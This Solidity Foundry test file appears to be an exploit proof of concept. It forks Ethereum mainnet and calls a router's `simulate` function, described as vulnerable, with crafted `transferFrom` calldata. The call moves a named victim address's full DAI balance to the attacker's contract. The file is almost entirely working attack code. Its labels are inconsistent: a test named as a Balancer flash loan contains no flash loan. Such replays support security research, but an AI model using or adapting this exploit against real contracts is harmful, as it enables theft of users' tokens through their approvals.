// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC20.sol";


interface IAggrouterv5 {
    function simulate(address target, bytes calldata data) external;
}

contract ContractTest is Test  {
    IAggrouterv5 EtherBundlerV2 = IAggrouterv5(0x1111111254EEB25477B68fb85Ed929f73A960582);
    address vic = 0xbD2dd508C3cf02846a5867c00c82041ef8A13D30;
    IERC20 dia = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function setUp() public {
    vm.createSelectFork("mainnet", 14684822);
  }

  function testBalancer_flashloan() public {
    bytes memory data = abi.encodeWithSelector(
        bytes4(0x23b872dd), // transferFrom selector
            address(vic),
            address(this),
            dia.balanceOf(vic)
    );

        // Call the simulate function on the vulnerable contract
    EtherBundlerV2.simulate(address(this), data);

  }
}